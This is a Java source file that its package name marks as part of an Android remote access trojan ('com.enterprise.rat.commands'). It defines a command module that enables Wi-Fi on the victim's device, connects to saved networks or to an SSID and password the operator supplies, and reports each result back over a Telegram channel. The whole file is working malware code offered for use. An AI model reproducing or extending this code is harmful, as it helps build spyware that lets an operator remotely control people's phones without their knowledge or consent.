package com.enterprise.rat.commands;

import android.content.Context;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiManager;
import com.enterprise.rat.utils.TelegramApi;
import java.util.List;

public class WiFiAutoConnectManager {
    private Context context;
    public WiFiAutoConnectManager(Context context) { this.context = context; }

    public void autoConnect() {
        WifiManager wm = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (!wm.isWifiEnabled()) { TelegramApi.sendMessage("⚠ WiFi disabled."); return; }
        List<WifiConfiguration> configured = wm.getConfiguredNetworks();
        if (configured == null || configured.isEmpty()) { TelegramApi.sendMessage("⚠ No saved networks."); return; }
        List<android.net.wifi.ScanResult> scanResults = wm.getScanResults();
        for (WifiConfiguration config : configured) {
            for (android.net.wifi.ScanResult result : scanResults) {
                if (result.SSID.equals("\"" + config.SSID + "\"")) {
                    config.status = WifiConfiguration.Status.ENABLED;
                    int netId = wm.updateNetwork(config);
                    if (netId != -1) {
                        wm.enableNetwork(netId, true);
                        wm.reconnect();
                        TelegramApi.sendMessage("📶 Auto-connected to: <code>" + config.SSID + "</code>");
                        return;
                    }
                }
            }
        }
        TelegramApi.sendMessage("⚠ No available saved network found.");
    }

    public void connectToSSID(String ssid, String password) {
        WifiManager wm = (WifiManager) context.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        if (!wm.isWifiEnabled()) wm.setWifiEnabled(true);
        WifiConfiguration config = new WifiConfiguration();
        config.SSID = "\"" + ssid + "\"";
        config.preSharedKey = "\"" + password + "\"";
        config.status = WifiConfiguration.Status.ENABLED;
        int netId = wm.addNetwork(config);
        if (netId != -1) { wm.enableNetwork(netId, true); wm.reconnect(); TelegramApi.sendMessage("📶 Connecting to: <code>" + ssid + "</code>"); }
        else TelegramApi.sendMessage("❌ Failed to add network.");
    }
}
